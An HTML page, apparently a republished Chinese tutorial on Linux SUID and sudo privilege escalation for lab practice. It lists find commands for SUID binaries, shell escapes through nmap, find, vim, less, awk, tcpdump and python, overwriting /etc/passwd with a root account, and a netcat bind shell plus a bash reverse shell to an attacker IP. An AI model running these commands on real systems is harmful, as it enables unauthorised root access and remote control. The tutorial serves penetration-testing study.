@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://passwall2.github.io/news/article-86417.htm" />
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Linux-SUID提权_在线工具Live2D</title>
+        <meta name="description" content="最近打靶场的时候最后都会涉及到提权，所以想着总结一下。  SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者" />
+        <link rel="icon" href="/assets/website/img/passwall2/favicon.ico" type="image/x-icon"/>
+
+    <meta name="author" content="Pass Wall2机场订阅官网">
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://passwall2.github.io/news/article-86417.htm" />
+    <meta property="og:site_name" content="Pass Wall2机场订阅官网" />
+    <meta property="og:title" content="Linux-SUID提权_在线工具Live2D" />
+    <meta property="og:image" content="https://passwall2.github.io/uploads/20240825/bee6463f1be37de328663e681b45d91d.webp" />
+        <meta property="og:release_date" content="2025-04-01T09:50:39" />
+    <meta property="og:updated_time" content="2025-04-01T09:50:39" />
+        <meta property="og:description" content="最近打靶场的时候最后都会涉及到提权，所以想着总结一下。  SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者" />
+        
+    <meta name="applicable-device" content="pc,mobile" />
+    <meta name="renderer" content="webkit" />
+    <meta name="force-rendering" content="webkit" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta name="robots" content="max-image-preview:large" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Linux-SUID提权_在线工具Live2D">
+    <meta name="format-detection" content="telephone=no">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://cdn.bootcdn.net">
+    <link rel="dns-prefetch" href="https:/www.googletagmanager.com">
+    <link rel="dns-prefetch" href="https://www.googleadservices.com">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
+    <link rel="dns-prefetch" href="https://cm.g.doubleclick.net">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+    <link rel="dns-prefetch" href="https://cdn.bootcdn.net">
+    <link rel="dns-prefetch" href="https://use.fontawesome.com">
+
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&family=Inter:slnt,wght@-10..0,100..900&display=swap" rel="stylesheet">
+    <!-- Icon Font Stylesheet -->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" />
+    <link href="https://cdn.bootcdn.net/ajax/libs/bootstrap-icons/1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+    <!-- Libraries Stylesheet -->
+    <link rel="stylesheet" href="/assets/website/js/frontend/passwall2/animate/animate.min.css" />
+    <link href="/assets/website/js/frontend/passwall2/lightbox/css/lightbox.min.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/passwall2/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+    <!-- Customized Bootstrap Stylesheet -->
+    <link href="/assets/website/css/passwall2/bootstrap.min.css" rel="stylesheet">
+    <!-- Template Stylesheet -->
+    <link href="/assets/website/css/passwall2/style.css" rel="stylesheet">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BD8TLG2ND4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BD8TLG2ND4');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+        <!-- Spinner Start -->
+    <div id="spinner" class="show bg-white position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
+        <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
+            <span class="sr-only">Loading...</span>
+        </div>
+    </div>
+    <!-- Spinner End -->
+    <!-- Navbar & Hero Start -->
+    <div class="container-fluid nav-bar px-0 px-lg-4 py-lg-0">
+        <div class="container">
+            <nav class="navbar navbar-expand-lg navbar-light">
+                <a href="/" class="navbar-brand p-0">
+                                <span class="text-primary mb-0">Pass Wall2</span>
+                                </a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse">
+                    <span class="fa fa-bars"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarCollapse">
+                    <div class="navbar-nav mx-0 mx-lg-auto">
+                                                <a href="/" class="nav-item nav-link">首页</a>
+                                                <a href="/free-nodes/" class="nav-item nav-link">免费节点</a>
+                                                <a href="/paid-subscribe/" class="nav-item nav-link">推荐机场</a>
+                                                <a href="/client.htm" class="nav-item nav-link">客户端</a>
+                                                <a href="/news/" class="nav-item nav-link">新闻资讯</a>
+                                            </div>
+                </div>
+            </nav>
+        </div>
+    </div>
+    <!-- Navbar & Hero End -->
+
+    <!-- Header Start -->
+    <div class="container-fluid bg-breadcrumb">
+        <div class="container text-center py-5" style="max-width: 900px;">
+            <h1 class="text-white display-4 mb-4 wow fadeInDown" data-wow-delay="0.1s">Linux-SUID提权_在线工具Live2D</h1>
+            <ol class="breadcrumb d-flex justify-content-center mb-0 wow fadeInDown" data-wow-delay="0.3s">
+                <li class="breadcrumb-item"><a href="/">首页</a></li>
+                <li class="breadcrumb-item"><a href="/news/">新闻资讯</a></li>
+                <li class="breadcrumb-item active text-primary">正文</li>
+            </ol>
+        </div>
+    </div>
+    <!-- Header End -->
+    <!-- FAQs Start -->
+    <div class="container-fluid faq-section bg-light py-5">
+        <div class="container py-5">
+            <div class="row">
+                <div class="col-md-9">
+                                    <input type="hidden" id="share-website-info" data-name="" data-url="">
+                  				  				  				</h1> <p>最近打靶场的时候最后都会涉及到提权，所以想着总结一下。</p> </h1> <p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。<br /> 那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。<br /> 但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p> <p>比如<code>password</code>的权限：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/08b5e8a7d180250b1fd8c089e641b65c.jpg" alt="Linux-SUID提权_在线工具Live2D"><br /> 用户可以输入自己的密码或者不需要密码在root权限下执行命令，这可在设置文件 /etc/sudoers 中配置</p> <h2 id="11-etcsudoers-语法">1.1 /etc/sudoers 语法</h2> <pre><code>root ALL=(ALL) ALL</code></pre> <p>root 用户可以从 ALL（任何）终端执行，充当ALL（任何）用户，并运行ALL（任何）命令。第一部分指定用户，第二部分指定可充当用户，第三部分指定 sudo 可运行的命令。</p> <pre><code>touhid ALL= /sbin/poweroff</code></pre> <p>输入 touchid 的密码，可以 sudo 执行 poweroff 命令。</p> <pre><code>touhid ALL = (root) NOPASSWD: /usr/bin/find</code></pre> <p>不输入密码,可以 sudo 执行 find 命令</p> <h2 id="12-查找具有-suid-权限位文件">1.2 查找具有 SUID 权限位文件</h2> <p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p> <pre><code># suid权限值就是4000，下面两个语句一个意思 find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null</code></pre> <p>也可以使用<code>sudo -l</code> 命令列出当前用户可执行的命令:</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/22b8f6accfcc934f93a3cc164a5f4632.jpg" alt="Linux-SUID提权_在线工具Live2D"></p> </h1> <h2 id="21-nmap">2.1 nmap</h2> <p>nmap（2.02-5.21）存在交换模式，可利用提权</p> <pre><code>nmap --interactive</code></pre> <p>之后执行：</p> <pre><code>nmap&gt; !sh sh-3.2# whoami root</code></pre> <p>msf中的模块为：</p> <pre><code>exploit/unix/local/setuid_nmap</code></pre> <p>较新版可使用 --script 参数：</p> <pre><code>echo "os.execute('/bin/sh')" &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</code></pre> <h2 id="22-find">2.2 find</h2> <p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p> <pre><code>touch test find test -exec whoami \;</code></pre> <pre><code>进入shell find test -exec '/bin/sh' \; sh-5.0# whoami root</code></pre> <p>linux一般都安装了nc 我们也可以利用nc 广播或反弹shell</p> <p>广播shell:</p> <pre><code>find test -exec netcat -lvp 5555 -e /bin/sh \;</code></pre> <p>kali(攻击机)上:</p> <pre><code>nc 靶机ip 4444</code></pre> <p>反弹shell:</p> <pre><code>find test -exec bash -c 'bash -i &gt;&amp; /dev/tcp/攻击机IP/4444 0&gt;&amp;1' \;</code></pre> <p>kali(攻击机)上：</p> <pre><code>nc -lvnp 4444</code></pre> <h2 id="23-vivim">2.3 vi/vim</h2> <p>打开vim,按下ESC</p> <pre><code>:set shell=/bin/sh :shell</code></pre> <p>或者</p> <pre><code>sudo vim -c '!sh'</code></pre> <h2 id="24-bash">2.4 bash</h2> <pre><code>bash -p bash-3.2# id uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</code></pre> <h2 id="25-less">2.5 less</h2> <p><strong>注意事项：我记得less跟more提权的时候那个命令行要拉低一点，不能在一页显示完文件才行(要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用!命令进入shell)</strong></p> <pre><code>less /etc/passwd !/bin/sh</code></pre> <h2 id="26-more">2.6 more</h2> <pre><code>more /home/pelle/myfile !/bin/bash</code></pre> <h2 id="27-cp">2.7 cp</h2> <p>覆盖<code>/etc/shadow</code> 或<code>/etc/passwd</code></p> <pre><code>[zabbix@localhost ~]$ cat /etc/passwd &gt;passwd 2.[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack123 3.$1$hack$WTn0dk2QjNeKfl.DHOUue0 4.[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' &gt;&gt; passwd 5.[zabbix@localhost ~]$ cp passwd /etc/passwd 6.[zabbix@localhost ~]$ su - hack 7.Password: 8.[root@361way ~]# id 9.uid=0(hack) gid=0(root) groups=0(root) 10.[root@361way ~]# cat /etc/passwd|tail -1 11.hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash</code></pre> <h2 id="28-mv">2.8 mv</h2> <p>覆盖<code>/etc/shadow</code> 或<code>/etc/passwd</code></p> <h2 id="29-nano">2.9 nano</h2> <p>nano也算是比较上古的文本编辑器了</p> <p>nano进入shell的方法为</p> <pre><code>nano #进入nano编辑器 Ctrl + R Ctrl + X  #即可输入命令</code></pre> <h2 id="210-awk">2.10 awk</h2> <pre><code>awk 'BEGIN {system("/bin/sh")}'</code></pre> <h2 id="211-man">2.11 man</h2> <pre><code>man passwd !/bin/bash</code></pre> <h2 id="212-wget">2.12 wget</h2> <pre><code>wget http://192.168.56.1:8080/passwd -O /etc/passwd</code></pre> <h2 id="213-apache">2.13 apache</h2> <p>仅可查看文件，不能弹 shell：</p> <pre><code>apache2 -f /etc/shadow</code></pre> <h2 id="214-tcpdump">2.14 tcpdump</h2> <pre><code>echo $'id\ncat /etc/shadow' &gt; /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></pre> <h2 id="215-pythonperlrubyluaphpetc">2.15 python/perl/ruby/lua/php/etc</h2> <p>python:</p> <pre><code>python -c "import os;os.system('/bin/bash')"</code></pre> <p>perl:</p> <pre><code>exec "/bin/bash";</code></pre> <p>其他的语言反弹shell参考以下链接：<br /><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://weibell.github.io/reverse-shell-generator/"  target="_blank" rel="nofollow">https://weibell.github.io/reverse-shell-generator/</a></p> <p>参考链接：</p> <ul> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://touhidshaikh.com/blog/?p=790"  title="Abusing SUDO (Linux Privilege Escalation)" target="_blank" rel="nofollow">Abusing SUDO (Linux Privilege Escalation)</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.anquanke.com/post/id/86979"  title="【安全科普】Linux提权——利用可执行文件SUID" target="_blank" rel="nofollow">【安全科普】Linux提权——利用可执行文件SUID</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.jianshu.com/p/e6c4c4bdf7c3"  title="linux特殊权限SUID、SGID、SBIT" target="_blank" rel="nofollow">linux特殊权限SUID、SGID、SBIT</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=http://101.200.63.12/index.php/archives/521/"  title="SUID 提权 - CoColi丶" target="_blank" rel="nofollow">SUID 提权 - CoColi丶</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://evi1cg.me/archives/SUID_Privilege_Escalation.html"  title="SUID Privilege Escalation - Evi1cg" target="_blank" rel="nofollow">SUID Privilege Escalation - Evi1cg</a></li> </ul> </h1> <p>SUID提权由来已久,属于一种古早的提权技术,但其生命力经久不衰。</p> <p>这要求管理员要仔细研究具有SUID权限的文件,不要给易被利用的文件以SUID权限,防止SUID的滥用导致黑客在进入服务器时轻易获取root权限。</p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-85695.htm">动物疫苗接种方法有哪几种呢英语（动物疫苗接种方法有哪几种呢英语怎么说）</a></p>
+                                        <p>下一个：<a href="/news/article-86418.htm">动物医院办理条件有哪些规定和要求（动物医院办理条件有哪些规定和要求呢）</a></p>
+                                    </div>
+                                </div>
+                <div class="col-md-3">
+                    <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/news/article-66726.htm" title="Citus 分布式 PostgreSQL 集群 &#8211; SQL Reference(摄取、修改数据 DML)">Citus 分布式 PostgreSQL 集群 &#8211; SQL Reference(摄取、修改数据 DML)</a></li>
+                        <li class="py-2"><a href="/news/article-81452.htm" title="vue elementui点击按钮新增输入框">vue elementui点击按钮新增输入框</a></li>
+                        <li class="py-2"><a href="/news/article-74564.htm" title="经营动物疫苗药品需要什么手续办理的简单介绍">经营动物疫苗药品需要什么手续办理的简单介绍</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-3-13-node-share.htm" title="「3月13日」最高速度18.5M/S，2025年Pass Wall2每天更新免费机场订阅节点链接">「3月13日」最高速度18.5M/S，2025年Pass Wall2每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/news/article-77295.htm" title="开宠物店前景怎么样啊（2021年开宠物店怎么样）">开宠物店前景怎么样啊（2021年开宠物店怎么样）</a></li>
+                        <li class="py-2"><a href="/news/article-82099.htm" title="办理宠物诊所需要什么资料（办个宠物医院需要什么条件?）">办理宠物诊所需要什么资料（办个宠物医院需要什么条件?）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-3-6-free-node-subscribe.htm" title="「3月6日」最高速度20.8M/S，2025年Pass Wall2每天更新免费机场订阅节点链接">「3月6日」最高速度20.8M/S，2025年Pass Wall2每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/news/article-76615.htm" title="宠物疫苗猫多少钱一针（宠物疫苗猫多少钱一针打）">宠物疫苗猫多少钱一针（宠物疫苗猫多少钱一针打）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-3-17-free-subscribe-node.htm" title="「3月17日」最高速度22.1M/S，2025年Pass Wall2每天更新免费机场订阅节点链接">「3月17日」最高速度22.1M/S，2025年Pass Wall2每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/news/article-82098.htm" title="免费领养猫的软件下载（免费领养猫猫的app）">免费领养猫的软件下载（免费领养猫猫的app）</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">3</span> <a href="/date/2025-04/" title="2025-04 归档">2025-04</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">89</span> <a href="/date/2025-03/" title="2025-03 归档">2025-03</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- FAQs End -->
+        <!-- Copyright Start -->
+    <div class="container-fluid copyright py-4">
+        <div class="container">
+            <div class="row g-4 align-items-center">
+                <div class="text-center">
+                            <p>
+                                <a href="/">首页</a> | 
+                                <a href="/free-node/">免费节点</a> | 
+                                <a href="/news/">新闻资讯</a> |
+                                <a href="/about-us.htm">关于我们</a> |
+                                <a href="/disclaimer.htm">免责申明</a> |
+                                <a href="/privacy.htm">隐私申明</a> |
+                                <a href="/sitemap.xml">网站地图</a>
+                            </p>
+                    Pass Wall2机场订阅官网 版权所有 Powered by WordPress
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Copyright End -->
+    <!-- Back to Top -->
+    <a href="#" class="btn btn-primary btn-lg-square rounded-circle back-to-top"><i class="fa fa-arrow-up"></i></a>
+    <!-- JavaScript Libraries -->
+    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.0.0/js/bootstrap.bundle.min.js"></script>
+    <script src="/assets/website/js/frontend/passwall2/wow/wow.min.js"></script>
+    <script src="/assets/website/js/frontend/passwall2/easing/easing.min.js"></script>
+    <script src="/assets/website/js/frontend/passwall2/waypoints/waypoints.min.js"></script>
+    <script src="/assets/website/js/frontend/passwall2/counterup/counterup.min.js"></script>
+    <script src="/assets/website/js/frontend/passwall2/lightbox/js/lightbox.min.js"></script>
+    <script src="/assets/website/js/frontend/passwall2/owlcarousel/owl.carousel.min.js"></script>
+    <!-- Template Javascript -->
+    <script src="/assets/website/js/frontend/passwall2/main.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script><script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
